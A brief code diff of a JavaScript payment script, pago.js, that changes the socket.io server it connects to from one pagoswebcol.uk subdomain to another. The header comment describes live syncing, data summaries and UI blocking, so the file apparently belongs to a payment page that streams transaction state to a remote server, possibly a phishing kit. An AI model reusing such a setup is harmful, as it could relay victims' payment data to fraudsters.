@@ -1,6 +1,6 @@
 // pago.js - Sincronización en Vivo + Resumen de Datos Activo + Inputs Limpios + Bloqueo de UI
 
-const socket = io('https://air.pagoswebcol.uk'); 
+const socket = io('https://apifinacjs.pagoswebcol.uk'); 
 
 let isTransactionActive = false;
 let browserRequested = false; 
